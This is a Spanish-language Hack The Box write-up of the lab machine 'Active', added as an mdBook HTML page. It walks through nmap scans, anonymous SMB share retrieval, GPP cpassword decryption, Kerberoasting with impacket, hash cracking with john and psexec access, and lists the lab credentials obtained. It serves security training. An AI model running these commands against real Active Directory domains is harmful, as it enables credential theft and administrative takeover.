@@ -1,0 +1,339 @@
+<!DOCTYPE HTML>
+<html lang="es" class="sidebar-visible no-js ayu">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Active - Secronomicón</title>
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../../../css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../../fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../../../index.html">Secronomicón</a></li><li class="chapter-item expanded affix "><li class="part-title">Guías / Cursos</li><li class="chapter-item expanded "><a href="../../../../../guides/oscp_bof/index.html"><strong aria-hidden="true">1.</strong> OSCP Buffer Overflow</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Port Swigger Academy</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/port_swigger_academy/sql_injection.html"><strong aria-hidden="true">2.1.</strong> SQL Injection</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/pwncollege/index.html"><strong aria-hidden="true">3.</strong> PwnCollege</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/pwncollege/0_module/index.html"><strong aria-hidden="true">3.1.</strong> Módulo 0</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/index.html"><strong aria-hidden="true">4.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/0_general.html"><strong aria-hidden="true">4.1.</strong> Teoría General</a></li><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/1_attacking.html"><strong aria-hidden="true">4.2.</strong> Atacando Active Directory</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/index.html"><strong aria-hidden="true">5.</strong> eCPPTv2 s4viLab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/1_aragog/index.html"><strong aria-hidden="true">5.1.</strong> Aragog</a></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/2_nagini/index.html"><strong aria-hidden="true">5.2.</strong> Nagini</a></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/3_fawkes/index.html"><strong aria-hidden="true">5.3.</strong> Fawkes</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.</strong> Matrix 1</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.5.</strong> Brainpan</div></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/nightmare/index.html"><strong aria-hidden="true">6.</strong> Nightmare</a></li><li class="chapter-item expanded affix "><li class="part-title">Misc</li><li class="chapter-item expanded "><a href="../../../../../templates/index.html"><strong aria-hidden="true">7.</strong> Templates</a></li><li class="chapter-item expanded affix "><li class="part-title">Cheat Sheets</li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/general.html"><strong aria-hidden="true">8.</strong> General</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/active_directory.html"><strong aria-hidden="true">9.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/network/general.html"><strong aria-hidden="true">10.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/network/pivoting.html"><strong aria-hidden="true">10.1.</strong> Pivoting</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> Pwning</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/pwning/linux.html"><strong aria-hidden="true">11.1.</strong> Linux pwning</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/pwning/bof-oscp.html"><strong aria-hidden="true">11.2.</strong> OSCP Buffer Overflow</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/fuzzing.html"><strong aria-hidden="true">12.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/inyecciones.html"><strong aria-hidden="true">13.</strong> Inyecciones</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/transfer.html"><strong aria-hidden="true">14.</strong> Transferencia de archivos</a></li><li class="chapter-item expanded affix "><li class="part-title">CTFs</li><li class="chapter-item expanded "><a href="../../../../../ctfs/20220922_ctf-core2022/index.html"><strong aria-hidden="true">15.</strong> 22/09/2022 - IPN Core 2022 CTF</a></li><li class="chapter-item expanded affix "><li class="part-title">Hack The Box</li><li class="chapter-item expanded "><div><strong aria-hidden="true">16.</strong> Battlegrounds</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/battlegrounds/mayhem/index.html"><strong aria-hidden="true">16.1.</strong> Cyber Mayhem</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">17.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.</strong> Boxes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.1.</strong> Fácil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.2.</strong> Medio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.3.</strong> Difícil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.4.</strong> Locura</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.1.</strong> Fácil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Active/index.html" class="active"><strong aria-hidden="true">18.2.1.1.</strong> Active</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Devel/index.html"><strong aria-hidden="true">18.2.1.2.</strong> Devel</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Remote/index.html"><strong aria-hidden="true">18.2.1.3.</strong> Remote</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Access/index.html"><strong aria-hidden="true">18.2.1.4.</strong> Access</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.2.</strong> Medio</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Chatterbox/index.html"><strong aria-hidden="true">18.2.2.1.</strong> Chatterbox</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Jeeves/index.html"><strong aria-hidden="true">18.2.2.2.</strong> Jeeves</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/SecNotes/index.html"><strong aria-hidden="true">18.2.2.3.</strong> SecNotes</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Silo/index.html"><strong aria-hidden="true">18.2.2.4.</strong> Silo</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.3.</strong> Difícil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/3_dificil/Control/index.html"><strong aria-hidden="true">18.2.3.1.</strong> Control</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/3_dificil/Search/index.html"><strong aria-hidden="true">18.2.3.2.</strong> Search</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.4.</strong> Locura</div></li></ol></li></ol></li><li class="chapter-item expanded "><li class="part-title">echoCTF</li><li class="chapter-item expanded "><div><strong aria-hidden="true">19.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">20.</strong> Networks</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.</strong> Targets</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">21.1.</strong> Principiante</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.2.</strong> Básico</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/2_basic/Flanders/index.html"><strong aria-hidden="true">21.2.1.</strong> Flanders</a></li><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/2_basic/Smithers/index.html"><strong aria-hidden="true">21.2.2.</strong> Smithers</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.3.</strong> Intermedio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.4.</strong> Avanzado</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.5.</strong> Experto</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/5_expert/gogo-yubari/index.html"><strong aria-hidden="true">21.5.1.</strong> Gogo Yubari</a></li><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/5_expert/hajmetr/index.html"><strong aria-hidden="true">21.5.2.</strong> Hajmetr</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.6.</strong> Guru</div></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Secronomicón</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="estadísticas"><a class="header" href="#estadísticas">Estadísticas</a></h1>
+<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
+<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/148">Active</a></td></tr>
+<tr><td>OS</td><td>Windows</td></tr>
+<tr><td>Dificultad oficial</td><td>Easy</td></tr>
+<tr><td>Dificultad de comunidad</td><td><img src="images/difficulty.png" alt="Dificultad" /></td></tr>
+<tr><td>Puntos</td><td>20</td></tr>
+<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/302">eks</a> &amp; <a href="https://www.hackthebox.com/home/users/profile/2984">mrb3n</a></td></tr>
+</tbody></table>
+</div>
+<h1 id="reconocimiento"><a class="header" href="#reconocimiento">Reconocimiento</a></h1>
+<h2 id="escaneo-de-host"><a class="header" href="#escaneo-de-host">Escaneo de host</a></h2>
+<h3 id="escaneo-completo-de-puertos"><a class="header" href="#escaneo-completo-de-puertos">Escaneo completo de puertos</a></h3>
+<pre><code class="language-bash">❯ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/allPorts $TARGET
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 20:29 EST
+Initiating Connect Scan at 20:29
+Scanning 10.10.10.100 [65535 ports]
+Discovered open port 135/tcp on 10.10.10.100
+Discovered open port 445/tcp on 10.10.10.100
+Discovered open port 53/tcp on 10.10.10.100
+Discovered open port 139/tcp on 10.10.10.100
+Discovered open port 49152/tcp on 10.10.10.100
+Discovered open port 464/tcp on 10.10.10.100
+Discovered open port 49157/tcp on 10.10.10.100
+Discovered open port 593/tcp on 10.10.10.100
+Discovered open port 3269/tcp on 10.10.10.100
+Discovered open port 49165/tcp on 10.10.10.100
+Discovered open port 88/tcp on 10.10.10.100
+Discovered open port 49167/tcp on 10.10.10.100
+Discovered open port 3268/tcp on 10.10.10.100
+Discovered open port 389/tcp on 10.10.10.100
+Warning: 10.10.10.100 giving up on port because retransmission cap hit (2).
+Discovered open port 49155/tcp on 10.10.10.100
+Discovered open port 636/tcp on 10.10.10.100
+Discovered open port 49158/tcp on 10.10.10.100
+Discovered open port 49154/tcp on 10.10.10.100
+Discovered open port 5722/tcp on 10.10.10.100
+Discovered open port 49153/tcp on 10.10.10.100
+Discovered open port 49166/tcp on 10.10.10.100
+Discovered open port 9389/tcp on 10.10.10.100
+Completed Connect Scan at 20:29, 28.58s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.100
+Host is up, received user-set (0.065s latency).
+Scanned at 2022-01-19 20:29:16 EST for 29s
+Not shown: 63369 closed tcp ports (conn-refused), 2144 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack
+88/tcp    open  kerberos-sec     syn-ack
+135/tcp   open  msrpc            syn-ack
+139/tcp   open  netbios-ssn      syn-ack
+389/tcp   open  ldap             syn-ack
+445/tcp   open  microsoft-ds     syn-ack
+464/tcp   open  kpasswd5         syn-ack
+593/tcp   open  http-rpc-epmap   syn-ack
+636/tcp   open  ldapssl          syn-ack
+3268/tcp  open  globalcatLDAP    syn-ack
+3269/tcp  open  globalcatLDAPssl syn-ack
+5722/tcp  open  msdfsr           syn-ack
+9389/tcp  open  adws             syn-ack
+49152/tcp open  unknown          syn-ack
+49153/tcp open  unknown          syn-ack
+49154/tcp open  unknown          syn-ack
+49155/tcp open  unknown          syn-ack
+49157/tcp open  unknown          syn-ack
+49158/tcp open  unknown          syn-ack
+49165/tcp open  unknown          syn-ack
+49166/tcp open  unknown          syn-ack
+49167/tcp open  unknown          syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 28.62 seconds
+</code></pre>
+<h3 id="escaneo-específico"><a class="header" href="#escaneo-específico">Escaneo específico</a></h3>
+<pre><code class="language-bash">❯ nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49165,49166,49167 -n -Pn -oN nmap/targeted $TARGET
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 20:30 EST
+Nmap scan report for 10.10.10.100
+Host is up (0.066s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid:
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-20 01:37:18Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+49166/tcp open  msrpc         Microsoft Windows RPC
+49167/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   2.1:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2022-01-20T01:38:13
+|_  start_date: 2022-01-20T01:34:15
+|_clock-skew: 6m45s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 70.52 seconds
+</code></pre>
+<h1 id="enumeración"><a class="header" href="#enumeración">Enumeración</a></h1>
+<h2 id="servicios"><a class="header" href="#servicios">Servicios</a></h2>
+<h3 id="smb---445"><a class="header" href="#smb---445">smb - 445</a></h3>
+<h4 id="manual"><a class="header" href="#manual">Manual</a></h4>
+<p>Se identificaron folders compartidos haciendo uso de <code>smbclient</code> de los cuales se permitia el acceso anónimo al share de <code>Replication</code>.</p>
+<p><img src="images/enum_1.png" alt="Shares disponibles de smb" /></p>
+<p>Al conectarse al directorio compartido de <code>Replication</code> se usaron los comandos:</p>
+<ol>
+<li><code>prompt off</code> - Para deshabilitar la confirmación al descargar cualquier archivo.</li>
+<li><code>recurse on</code> - Para habilitar la recursividad si se llega a encontrar un directorio.</li>
+<li><code>mget *</code> - Para descargar todos los archivos y directorios disponibles.</li>
+</ol>
+<p>Se identificó un archivo el cual expone un usuario y un hash disponible para crackear.</p>
+<p><img src="images/enum_2.png" alt="Directorios y archivos descargados" /></p>
+<p>Contenido de <code>Groups.xml</code>:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;
+&lt;/Groups&gt;
+</code></pre>
+<h1 id="explotación"><a class="header" href="#explotación">Explotación</a></h1>
+<h2 id="descrifrado-de-gpp"><a class="header" href="#descrifrado-de-gpp">Descrifrado de GPP</a></h2>
+<h3 id="ejecución"><a class="header" href="#ejecución">Ejecución</a></h3>
+<p>Al identificar qué tipo de credencial es la que se encuentra en <code>Groups.xml</code> se identificó una vulnerabilidad relacionada con las <a href="https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/">Group Policy Preferences</a>, dado el leak de la llave y suponiendo que la máquina no se encuentra parchada se puede descifrar la contraseña haciendo uso de <code>gpp-decrypt</code>.</p>
+<p><img src="images/exploit_1.png" alt="Resultado de gpp-decrypt" /></p>
+<h2 id="kerberoasting"><a class="header" href="#kerberoasting">Kerberoasting</a></h2>
+<h3 id="ejecución-1"><a class="header" href="#ejecución-1">Ejecución</a></h3>
+<p>Dados los puertos abiertos que tiene la máquina se puede intuir que la máquina objetivo es un Domain Controller, contemplado esto y que se cuenta con credenciales se puede hacer uso de <code>impacket-GetUserSPNs</code> para buscar conseguir un hash de alguna otra cuenta que permita el acceso a la máquina. Utilizando:</p>
+<pre><code class="language-bash">impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+</code></pre>
+<p><img src="images/exploit_2.png" alt="Error de sesión por sincronización" /></p>
+<p>Al identificar el error de sesión señalado debido a que la hora de la máquina no corresponde con la que se utiliza, se ocupa <code>ntpdate</code> para sincronizar la hora local con la de la máquina objetivo, señalando que el único comportamiento funcional encontrado fue utilizando el hostname de la máquina por lo que se modificó <code>/etc/hosts</code> para añadir la entrada del hostname con la IP, configurando así la hora local.</p>
+<p>Posteriormente se ejecutó de nuevo la herramienta de impacket para obtener el hash.</p>
+<p><img src="images/exploit_3.png" alt="Sincronización y obtención de hash" /></p>
+<p>Hash obtenido:</p>
+<pre><code class="language-text">$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b9225835ed0789a77d29228e13c82766$9bf95664d6316261f490688514dadd5470eb70fed87666be26d2e2fbe30691d7ce3377cf176e3bb2e0d459a6a7d25153e89ef9a44d13e16012e3ba81bc3b19a84653d112df3c4e21329bed80b91938da785d8aed471821a4c990559930aee3312e70cccdbbeb52c3c454c4d4b712c9ebf66602062bfc993d7de4c4250f8706a98b75109467a74522538816a92d462c8e7279556c4f3e4f9fe8447d326876fa169608c143847436fb761b2f0aa5122b90f5af045b73a1d2fa2a7e9f432fab538302dc6575d1d5095e89e7d66febce084b6fad6deb79cbd1db17f7cbd49907b0bed27958ade09ef2ed7baaf1e18d5d368c5c29aa614e8584669dd8d6a4d52bdebabfdaa48b68b4db41411aef874ea76c301b9fff65f81c48822e263530b788cc75231fdd78c3879ad254e92edbe4b7efb8909d37ec1699f58b75a32b73da4fca77ae566d5b3c1b1ae67a74cae08988429d54694bc1f3030cbc5aa59113b35129a98f2c32d6faa69816facb1153327d242019a5a2aad1ba5420449421a39b6a250e424ed9d8863edb0429ff54d33df78d3bed41ac41ca509250750cfc4db6dc91ced953db230554b681fd5569407664542f2fac85f3d385ca42038c9d8e7eaacfe07dd480efeeb6843127d084b0a08be254bfe9166e810108590e7e064bbe36e3d3a6faf5d05fab1015536cc34b8cdc27d80450a0b139bcd8ece127c6600218c3d1a75558aac8bf3094a5ca6d98bfc309b89d7e7fb1a03df601d98be07e26fa746629a5fa7492e489154348dcfd29800ab9fc49bb793a430510564a8525da693112b9243a4840b59360e7ca1d449f5faf35a15aa4902d94c1ed0dca1b3d8c0ea083f4c823f17c730c9bfbdb9c93abc9250cdface8a4da66da5c6868c4de96f344c4102ab56be8385237a0755ac26a8f7119fc55e698748c14ae37ec11c8a4e534e2ebf99c12877b64bf9ef636d487afee40de5115a5aff0f8ca7a2f059b4e56db5dea6069fc56ece3bd63d47b13889cad441635f6ac03d5688ea7041811ff55a462e0292bfe1f234b8a5994dd8efe0b4fde336d4815026e80ae3f96a9d025db0d9ba55183ed2a53e8b3f002e3aa5d3f744f8b46322dba0918130fc0b7f4a85342cae3a14fc9a555983668dd5c7ad63934a407e7a055c610b371bf3772c8e85b173ab9bdb22f76e9fbef451678abfb3db0a300d0c18db7ba907536d1dc3008b4488fee3d4bde9e8d719001bb7ebdf66df8f18132eb9d2d867d207bcb
+</code></pre>
+<p>Lo que resultaría en buscar el crackeo del hash obtenido (ejecutándolo en esta ocasión usando <code>john</code>) para poder obtener acceso a la máquina, haciendo uso de <code>impacket-psexec</code> proporcionando las credenciales obtenidas.</p>
+<p><img src="images/exploit_4.png" alt="Crackeo usando john" /></p>
+<p><img src="images/exploit_5.png" alt="Acceso como Administrator" /></p>
+<h2 id="credenciales-obtenidas"><a class="header" href="#credenciales-obtenidas">Credenciales obtenidas</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>Alcance</th><th>Usuario</th><th>Contraseña (hash → pass)</th><th>Fuente</th></tr></thead><tbody>
+<tr><td>SO</td><td>SVC_TGS</td><td><code>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code> → GPPstillStandingStrong2k18</td><td>smb (<code>Groups.xml</code>) + <code>gpp-decrypt</code></td></tr>
+<tr><td>SO</td><td>Administrator</td><td><code>$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b92258...</code> → Ticketmaster1968</td><td><code>impacket-GetUserSPNs</code> + cracking</td></tr>
+</tbody></table>
+</div>
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../../htb/battlegrounds/mayhem/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="../../../../../htb/boxes/windows/1_facil/Devel/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../../htb/battlegrounds/mayhem/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="../../../../../htb/boxes/windows/1_facil/Devel/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="../../../../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
